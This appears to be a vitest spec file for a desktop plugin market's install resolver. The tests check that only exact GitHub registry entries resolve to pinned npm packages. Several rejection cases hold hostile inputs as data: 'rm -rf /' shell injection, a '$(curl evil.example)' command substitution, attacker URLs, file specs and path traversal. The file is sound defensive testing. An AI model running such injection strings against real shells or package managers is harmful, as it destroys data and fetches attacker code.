/**
 * The Plugin Market's source resolution boundary.
 *
 * A market card's `url` is a repository address, and the market UI posts exactly that URL as
 * its install request. The desktop adapter must turn it into a registry package spec without
 * ever deriving a name from the path, and without letting the renderer name a repository the
 * registry does not publish. These specs pin both halves: the resolution rules, and the
 * refusal of every request that is not one exact registry entry.
 */
import { describe, expect, it, vi } from 'vitest'
import {
  asCatalog,
  createMarketInstallResolver,
  installTargetOf,
  normalizeRegistryKey,
  type MarketRegistryEntry,
} from '../src/market-source.ts'

/** One catalog fixture shaped like the live registry's entries. */
const REGISTRY: readonly MarketRegistryEntry[] = [
  // A subtree entry whose npm package shares nothing with its path — the live
  // `dsh-web-all` case, where `packages/dsh-web-all` publishes `@linxin666/dsh-web-all`.
  {
    name: 'dsh-web#packages/dsh-web-all',
    url: 'https://github.com/zhu1090093659/dsh-web/tree/main/packages/dsh-web-all',
    npm: '@linxin666/dsh-web-all',
    version: '0.3.23',
  },
  // A subtree entry whose npm name differs from its directory leaf.
  {
    name: 'dsh-forge-studio#plugin-notes',
    url: 'https://github.com/0x7A7A6572/dsh-forge-studio/tree/main/packages/plugin-notes',
    npm: '@zzerx/dsh-plugin-notes',
    version: '0.2.2',
  },
  // A plain repository entry that publishes an unscoped package.
  {
    name: 'dsh-answer-reviewer',
    url: 'https://github.com/bycall/dsh-answer-reviewer',
    npm: 'dsh-answer-reviewer',
    version: '0.7.2',
  },
  // A repository entry with no published package.
  {
    name: 'dsh-quality-review',
    url: 'https://github.com/CAI-MH/dsh-quality-review',
    npm: null,
    version: null,
  },
  // A repository entry whose catalog carries no version.
  {
    name: 'dsh-unversioned',
    url: 'https://github.com/example/dsh-unversioned',
    npm: 'dsh-unversioned',
    version: null,
  },
]

/** Resolver over the fixture, with a loader that records its calls. */
function fixture(entries: readonly MarketRegistryEntry[] = REGISTRY) {
  const load = vi.fn(async () => entries)
  return { resolve: createMarketInstallResolver(load), load }
}

describe('market registry URL keys', () => {
  it('accepts the https GitHub form the registry publishes', () => {
    expect(normalizeRegistryKey('https://github.com/owner/repo')).toBe('https://github.com/owner/repo')
    expect(normalizeRegistryKey('https://github.com/owner/repo/tree/main/packages/x'))
      .toBe('https://github.com/owner/repo/tree/main/packages/x')
  })

  it('treats a trailing slash as the same entry', () => {
    expect(normalizeRegistryKey('https://github.com/owner/repo/')).toBe('https://github.com/owner/repo')
  })

  it.each([
    ['an attacker host', 'https://evil.example/plugin'],
    ['a non-GitHub host', 'https://gitlab.com/owner/repo'],
    ['plain http', 'http://github.com/owner/repo'],
    ['a file spec', 'file:///C:/plugins/evil'],
    ['a bare package name', 'dsh-context'],
    ['a scoped package name', '@scope/plugin'],
    ['a repository with only one path segment', 'https://github.com/owner'],
    ['a query string', 'https://github.com/owner/repo?ref=main'],
    ['a fragment', 'https://github.com/owner/repo#main'],
    ['percent encoding', 'https://github.com/owner/%2e%2e/repo'],
    ['a parent traversal', 'https://github.com/owner/repo/../../../etc'],
    ['an empty string', ''],
  ])('refuses %s as a registry key', (_label, value) => {
    expect(normalizeRegistryKey(value)).toBeNull()
  })
})

describe('registry entry to install target', () => {
  it('pins the entry npm package to the catalog version', () => {
    expect(installTargetOf(REGISTRY[0]!)).toEqual({ spec: '@linxin666/dsh-web-all@0.3.23', name: '@linxin666/dsh-web-all' })
  })

  it('keeps the npm name when the catalog has no version', () => {
    expect(installTargetOf(REGISTRY[4]!)).toEqual({ spec: 'dsh-unversioned', name: 'dsh-unversioned' })
  })

  it('returns null for an entry with no published package', () => {
    expect(installTargetOf(REGISTRY[3]!)).toBeNull()
  })

  it.each([
    ['a URL', 'https://evil.example/plugin'],
    ['a git shortcut', 'github:owner/repo'],
    ['a file spec', 'file:../evil'],
    ['a flag', '--ignore-scripts'],
    ['a shell fragment', 'dsh-context; rm -rf /'],
    ['a whitespace split', 'dsh-context --save-dev'],
  ])('refuses a catalog trying to smuggle %s through the npm field', (_label, npm) => {
    expect(installTargetOf({ name: 'x', url: 'https://github.com/o/r', npm, version: '1.0.0' })).toBeNull()
  })
})

describe('market install resolution', () => {
  it('resolves the dsh-web-all subtree entry to its canonical npm package', async () => {
    const { resolve } = fixture()
    const result = await resolve('https://github.com/zhu1090093659/dsh-web/tree/main/packages/dsh-web-all')
    expect(result).toMatchObject({
      ok: true,
      spec: '@linxin666/dsh-web-all@0.3.23',
      name: '@linxin666/dsh-web-all',
    })
  })

  it('resolves a subtree entry whose leaf differs from the package name', async () => {
    const { resolve } = fixture()
    const result = await resolve('https://github.com/0x7A7A6572/dsh-forge-studio/tree/main/packages/plugin-notes')
    expect(result).toMatchObject({ ok: true, spec: '@zzerx/dsh-plugin-notes@0.2.2' })
  })

  it('resolves an ordinary repository entry that publishes an unscoped package', async () => {
    const { resolve } = fixture()
    const result = await resolve('https://github.com/bycall/dsh-answer-reviewer')
    expect(result).toMatchObject({ ok: true, spec: 'dsh-answer-reviewer@0.7.2' })
  })

  it('accepts a trailing slash on the submitted URL', async () => {
    const { resolve } = fixture()
    await expect(resolve('https://github.com/bycall/dsh-answer-reviewer/')).resolves.toMatchObject({ ok: true })
  })

  it('refuses an entry that publishes no npm package', async () => {
    const { resolve } = fixture()
    await expect(resolve('https://github.com/CAI-MH/dsh-quality-review'))
      .resolves.toMatchObject({ ok: false, reason: 'no-npm-target' })
  })

  it('refuses an attacker URL that is in no registry entry', async () => {
    const { resolve } = fixture()
    await expect(resolve('https://evil.example/plugin'))
      .resolves.toMatchObject({ ok: false, reason: 'not-in-registry' })
  })

  it('refuses a GitHub URL the registry does not carry', async () => {
    const { resolve } = fixture()
    await expect(resolve('https://github.com/attacker/malicious-plugin'))
      .resolves.toMatchObject({ ok: false, reason: 'not-in-registry' })
  })

  it('refuses a repository that only shares a prefix with a registered entry', async () => {
    const { resolve } = fixture()
    await expect(resolve('https://github.com/bycall/dsh-answer-reviewer-evil'))
      .resolves.toMatchObject({ ok: false, reason: 'not-in-registry' })
  })

  it.each([
    ['file:', 'file:../evil'],
    ['dot-dot traversal', '../../secret'],
    ['a shell injection', 'dsh-context; rm -rf /'],
    ['a raw package name', 'dsh-context'],
    ['a git shortcut', 'github:owner/repo'],
    ['a command substitution', '$(curl evil.example)'],
  ])('refuses %s without consulting the registry', async (_label, request) => {
    const { resolve, load } = fixture()
    await expect(resolve(request)).resolves.toMatchObject({ ok: false, reason: 'not-in-registry' })
    expect(load).not.toHaveBeenCalled()
  })

  it('authorizes nothing when the registry cannot be read', async () => {
    const resolve = createMarketInstallResolver(async () => null)
    await expect(resolve('https://github.com/bycall/dsh-answer-reviewer'))
      .resolves.toMatchObject({ ok: false, reason: 'registry-unavailable' })
  })

  it('fetches the catalog once across lookups inside the cache window', async () => {
    const { resolve, load } = fixture()
    await resolve('https://github.com/bycall/dsh-answer-reviewer')
    await resolve('https://github.com/zhu1090093659/dsh-web/tree/main/packages/dsh-web-all')
    expect(load).toHaveBeenCalledTimes(1)
  })

  it('fetches the catalog again once the cache window lapses', async () => {
    let clock = 0
    const load = vi.fn(async () => REGISTRY)
    const resolve = createMarketInstallResolver(load, () => clock)
    await resolve('https://github.com/bycall/dsh-answer-reviewer')
    clock = 10 * 60 * 1000
    await resolve('https://github.com/bycall/dsh-answer-reviewer')
    expect(load).toHaveBeenCalledTimes(2)
  })
})

describe('catalog document admission', () => {
  it('reads the entries of a catalog document', () => {
    expect(asCatalog({ plugins: [{ name: 'a', url: 'https://github.com/o/r', npm: 'a', version: '1.0.0' }] }))
      .toEqual([{ name: 'a', url: 'https://github.com/o/r', npm: 'a', version: '1.0.0' }])
  })

  it.each([
    ['a null document', null],
    ['a string', 'plugins'],
    ['an object without plugins', { updated: '2026-01-01' }],
    ['a non-array plugins field', { plugins: {} }],
  ])('refuses %s', (_label, value) => {
    expect(asCatalog(value)).toBeNull()
  })

  it('drops members that are not entries rather than trusting them', () => {
    expect(asCatalog({ plugins: [
      { name: 'ok', url: 'https://github.com/o/r', npm: 'ok' },
      { name: 'no-url' },
      { url: 'https://github.com/o/r2' },
      null,
      'entry',
    ] })).toEqual([{ name: 'ok', url: 'https://github.com/o/r', npm: 'ok', version: null }])
  })
})
